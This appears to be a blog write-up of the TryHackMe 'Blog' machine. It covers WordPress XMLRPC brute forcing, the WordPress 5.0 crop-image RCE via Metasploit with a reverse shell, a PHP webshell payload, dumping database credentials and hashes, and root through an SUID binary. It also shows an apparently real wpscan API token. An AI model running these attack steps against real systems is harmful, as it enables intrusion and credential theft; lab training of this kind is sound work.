---
layout: post
title: THM Blog WriteUp
date: 2025-03-09
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - WordPress-Explotation
  - XMLRPC
  - Brute-Forcing
  - Image-Upload
  - SUID
  - Binary-Reverse-Engineering
media_subpath: /assets/img/Blog
---
![Desktop View](Blog.png){: w="400"  h="400" }



# Blog Skills


>**Blog** is a medium Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **WordPress Enumeration**
- **Brute Forcing WordPress Credentials via XMLRPC**
- **Exploiting WordPress 5.0 for Plugin Upload and RCE**
- **Reverse Shell Execution**
- **Linux Privilege Enumeration**
- **Reverse Engineering SUID Binaries**
- **Privilege Escalation via SUID Binary Exploitation**

---
## Pre-requisites

The owner of the machine tell use the following message: **In order to get the blog to work with AWS, you'll need to add 10.10.155.37 blog.thm to your /etc/hosts file.**

So let's add the domain to the `/etc/hosts` file.

```bash
❯ echo '10.10.155.37 blog.thm' >> /etc/hosts
```

Now we can start enumerating.

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22, 80, 139** & port **445**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.155.37 -oG allPorts
Nmap scan report for 10.10.155.37
Host is up, received user-set (0.54s latency).
Scanned at 2025-03-08 20:04:01 CET for 20s
Not shown: 61615 closed tcp ports (reset), 3916 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80,139,445 10.10.155.37 -oN targeted
Nmap scan report for blog.thm (10.10.155.37)
Host is up (0.081s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-03-08T19:06:20+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-08T19:06:20
|_  start_date: N/A
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3**
- **Port  80 -->  Apache httpd 2.4.29 ((Ubuntu))**
- **Port 139 --> Samba smbd 4.7.6-Ubuntu**
- **Port 445 --> Samba smbd 4.7.6-Ubuntu**

Let's start with the **Samba** service.

---
## Port 445 Enumeration

Let's start by checking if we can access any share without providing crdentials.

```bash
❯ smbclient -L \\10.10.155.37 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy's local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
```

Seems like we can access the `BillySMB` share as `anonymous`, let's see what's inside.

```bash
❯ smbclient \\\\10.10.155.37\\BillySMB -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 20:17:05 2020
  ..                                  D        0  Tue May 26 19:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
  check-this.png                      N     3082  Tue May 26 20:13:43 2020
```

We have found three files, so let's download them.

```bash
smb: \> mget *
Get file Alice-White-Rabbit.jpg? y
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (66.8 KiloBytes/sec) (average 66.8 KiloBytes/sec)
Get file tswift.mp4? y
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (309.9 KiloBytes/sec) (average 282.9 KiloBytes/sec)
Get file check-this.png? y
getting file \check-this.png of size 3082 as check-this.png (6.3 KiloBytes/sec) (average 255.6 KiloBytes/sec)
smb: \> exit
```

Once with the files i checked them, but nothing useful was found, so i decided to check if there was any data embed inside the files.

```bash
❯ steghide extract -sf Alice-White-Rabbit.jpg
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
```

I found a file called `rabbit_hole.txt` embed in the `Alice-White-Rabbit.jpg` file, the other two files are empty, let's see the content of the `rabbit_hole.txt` file.

```bash
❯ catn rabbit_hole.txt
You've found yourself in a rabbit hole, friend.
```

Unfortunately, we have fallen in a rabbit hole :), let's start with the enumeration of the **HTTP** service then.

---
## Port 80 Enumeration


At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb blog.thm
http://blog.thm [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.95.6], MetaGenerator[WordPress 5.0], PoweredBy[-wordpress,-wordpress,,WordPress,WordPress,], Script[text/javascript], Title[Billy Joel&#039;s IT Blog &#8211; The IT blog], UncommonHeaders[link], WordPress[5.0]
```

We can see that we are facing a **Wordpress 5.0** which is pretty old, let's take a look inside the website, once inside ***http://blog.thm***, we can see a simple blog.

![Desktop View](BlogMainPage.png) 

Checking for any publicly available exploits for this version i found a valid one.

```bash
❯ searchsploit core wordpress 5.0
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core 5.0 - Remote Code Execution                                                                                                              | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                                                             | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                 | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                 | php/dos/47800.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Taking a look at the script, it ask us for valid credentials, so let's run `wpscan` in order to find users and crucial information.

```bash
❯ wpscan --url http://blog.thm -e vp,u --api-token "***************************************"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.95.6]
[+] Started: Sun Mar  9 14:44:13 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

<REDACTED>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <============================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

<REACTED>
```

We found that `XMLRPC` is enabled that allow us to brute-force the login form without limited attempts, we also found two users: `kwheel` and `bjoel`, let's try to brute-force the password for any of the found users.

```bash
❯ wpscan --url http://blog.thm -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --api-token "WkDah4Og5UQhI6ZdhJrY5u855DH1CrubMqaTrlmjxvk"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.95.6]
[+] Started: Sun Mar  9 14:48:30 2025

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - kwheel / *********                           
```

After some time, we get valid credentials for the user `kwheel`, this user is not an admin account, but the exploit we found do not require it.

Analyzing the exploit the workflow follows the next steps:

1. **Upload a Malicious Image**:
    
    - An attacker uploads a specially crafted image (e.g., `gd.jpg`) to WordPress.
        
    - The image contains a PHP payload hidden in its metadata (e.g., using `exiftool`):

		```bash
		<?=`$_GET[0]`?>
		```
        
        This payload allows the attacker to execute commands via the URL.
        
2. **Manipulate Image Metadata**:
    
    - WordPress stores the image's path in a metadata field called `_wp_attached_file`.
        
    - The attacker changes this field to include a **path traversal** sequence:
        
		```bash
		2023/10/gd.jpg?/../../../../themes/<theme_name>/rahali
		```
        
        This tricks WordPress into saving the image in the theme folder (`wp-content/themes/<theme_name>/rahali`), which is accessible via the web.
        
3. **Trigger the Payload**:
    
    - When the image is accessed via the web, the PHP payload is executed.
        
    - For example, accessing:

		```bash
        http://<target>/wp-content/themes/<theme_name>/rahali?0=id
		```        
        
        will execute the `id` command on the server.

I will use the `metasploit` module for convenience.

```bash
❯ msfconsole
msf6 > use exploit/multi/http/wp_crop_rce
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.155.37
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD *********
msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.14.99.119
msf6 exploit(multi/http/wp_crop_rce) > run
[*] Started reverse TCP handler on 10.14.99.119:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (40004 bytes) to 10.10.95.6
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.14.99.119:4444 -> 10.10.95.6:47980) at 2025-03-09 15:10:20 +0100

meterpreter > 
```

Bingo, we have gained a shell as `www-data`.

---
## Shell as www-data

Once with a shell, we can begin with the **privilege escalation** phase, firstly i checked the website structure, since we are facing a **Wordpress** website, let's check the `wp-config.php` in order to check the `bjoel` credentials.   

```bash
/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

Once with the `mySQL` credentials, let's check the database.

```bash
www-data@blog:/var/www/wordpress$ mysql -u wordpressuser -p
Enter password: LittleYellowLamp90!@

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| blog               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use blog;
use blog;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_blog        |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
|  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
2 rows in set (0.00 sec)
```

We found the following hash for `bjoel`: `bjoel:$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/`.

I tried cracking it, but without success.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:53 DONE (2025-03-09 15:25) 0g/s 61475p/s 61475c/s 61475C/s !!!@@@!!!..*7¡Vamos!
Session completed. 
```

Nothing found, checking the **SUID** binaries, I found an unusual binary named `checker`

```bash
www-data@blog:/$ find / -perm -4000 2>/dev/null

<REDACTED>

/usr/sbin/checker

<REDACTED>
```

Checking the readable characters of the binary we can't get much out of it, but it is using the `getenv` function.

```bash
www-data@blog:/$ strings /usr/sbin/checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=9	
AWAVI
AUATL
[]A\A]A^A_
admin
/bin/bash
Not an Admin
```

Let's use `ltrace` to see the workflow of the binary.

```bash
www-data@blog:/$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

So, the script check if we have a environment variable named `admin`, let's see how the script develops if we create a variable named `admin`.

```bash
www-data@blog:/$ export admin=admin
www-data@blog:/$ /usr/sbin/./checker          
root@blog:/# whoami
root
```

Somehow, we have gained a shell as `root`, so let's now read the `user.txt` and the `root.txt`.

```bash
root@blog:/root# cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

Seems like we have to seek a bit to find the real `user.txx`.

```bash
root@blog:/root# find / -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

Bingo, the `user.txt` flag is stored at `/media/usb/user.txt`, let's read it.

```bash
root@blog:/root# cat /media/usb/user.txt
c842******e571f7af486******a8ab7
```

The `root.txt` flag is stored in the usual path at `/root/root.txt`, let's read it.

```bash
root@blog:/root# cat /root/root.txt
9a0******bef9bfa7ac28******f318
```

---
## Final Thoughts

The **Blog** machine on TryHackMe provides an excellent opportunity to practice **WordPress exploitation** and **Linux privilege escalation** techniques. The initial phase involves brute-forcing user credentials by abusing the enabled **XMLRPC** feature in WordPress, highlighting the risks of leaving unnecessary services exposed. Once access is gained, the machine demonstrates the exploitation of **WordPress 5.0** to upload a malicious image and execute a reverse shell, emphasizing the importance of keeping CMS software up to date. The privilege escalation phase requires reverse engineering a **SUID binary**, showcasing the need for secure coding practices and proper permission management. This machine effectively reinforces skills in **web application enumeration**, **password brute-forcing**, **reverse shell execution**, and **binary analysis**, making it a valuable learning experience for aspiring penetration testers.

![Desktop View](BlogPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

